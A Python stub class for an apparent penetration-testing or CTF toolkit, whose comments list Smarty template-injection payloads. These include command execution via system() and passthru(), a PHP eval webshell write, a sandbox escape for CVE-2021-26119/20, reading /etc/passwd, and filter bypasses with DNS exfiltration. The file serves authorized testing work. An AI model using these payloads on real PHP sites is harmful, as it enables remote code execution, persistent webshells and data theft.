"""Smarty SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: {$smarty.version}→版本号、{$smarty.security}→1/0、{math equation="7*7"}→49。
直接 RCE(security 关闭): {system(cmd)}、回显式 {if system(cmd)}{/if}、{passthru(cmd)}、{assert("file_put_contents('a.php','<?php @eval($_POST[1]);?>')")} 写 webshell(PHP7)。
security 逃逸(3.1.x<3.1.39, CVE-2021-26119/20): {$smarty.template_object->smarty->disableSecurity()} 再 {system(cmd)};3.1.39+ 已修复。
文件读: {include file='/flag'}、{fetch file='/etc/passwd'}(file_get_contents);Smarty 2: {php}...{/php}、{include_php file=}。
绕过: 函数名大写 {SYSTEM(cmd)}、引号过滤用 $smarty.get.x 外带、无回显写 webshell / {if} 布尔回显 / DNS 外带。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiSmartyTool(SstiEngineTool):
    name = "ssti_smarty"
    description = "Smarty(PHP) SSTI:{system()} 执行、security 沙箱逃逸、include/fetch 文件读(占位符)"
    engine_key = "smarty"
    engine_name = "Smarty"
    default_mode = "exec"
    plan = r"""指纹: {$smarty.version}→版本号、{$smarty.security}→1/0、{math equation="7*7"}→49。
直接 RCE(security 关闭): {system(cmd)}、回显式 {if system(cmd)}{/if}、{passthru(cmd)}、{assert("file_put_contents('a.php','<?php @eval($_POST[1]);?>')")} 写 webshell(PHP7)。
security 逃逸(3.1.x<3.1.39, CVE-2021-26119/20): {$smarty.template_object->smarty->disableSecurity()} 再 {system(cmd)};3.1.39+ 已修复。
文件读: {include file='/flag'}、{fetch file='/etc/passwd'}(file_get_contents);Smarty 2: {php}...{/php}、{include_php file=}。
绕过: 函数名大写 {SYSTEM(cmd)}、引号过滤用 $smarty.get.x 外带、无回显写 webshell / {if} 布尔回显 / DNS 外带。"""
